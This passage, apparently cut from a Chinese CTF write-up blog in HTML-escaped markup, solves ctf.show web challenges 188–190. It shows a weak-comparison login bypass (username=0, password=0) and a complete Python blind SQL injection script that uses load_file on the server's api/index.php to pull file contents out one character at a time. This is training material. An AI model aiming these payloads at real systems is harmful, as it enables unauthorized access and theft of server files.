punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;登陆成功&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;array_push&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;data&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;flag&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$flag&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;弱等于，字符串和数字比较，当字符串 = 0 恒成立，故可 username=0，password=0&lt;/p&gt;
&lt;h1 id=&#34;web-189&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-189&#34;&gt;#&lt;/a&gt; web 189&lt;/h1&gt;
&lt;p&gt;提示 flag 在 api/index.php 文件中&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; time &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sleep&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://fc44b510-a611-4cd6-86f7-2d734b41e643.challenge.ctf.show/api/&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getFlagIndex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    head &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    tail &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;300&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; head &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; tail&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;head &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; tail&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#39;username&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;if(locate(&#39;ctfshow{&#39;,&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;load_file(&#39;/var/www/html/api/index.php&#39;))&amp;gt;{0},0,1)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token string&#34;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;密码错误&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;json&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            head &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            tail &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getFlag&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        head &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        tail &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;127&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; head &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; tail&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            mid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;head &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; tail&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token string&#34;&gt;&#39;username&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;if(ascii(substr(load_file(&#39;/var/www/html/api/index.php&#39;),{0},1))&amp;gt;{1},0,1)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                                                                                               &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                                                                                                                   mid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token string&#34;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;密码错误&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;json&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                head &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                tail &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; mid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            mid &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; head &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt; head &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            result &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;head&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;}&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    index &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; getFlagIndex&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    getFlag&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;web-190&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-190&#34;&gt;#&lt;/a&gt; web 190&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Author       : dpm12345 1006975692@qq.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Github       : https://github.com/dpm12345&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Date         : 2023-07-15 17:17:55&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LastEditors  : dpm12345 1006975692@qq.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LastEditTime : 2023-07-15 17:59:09&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Description  : &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; string&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pwd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token 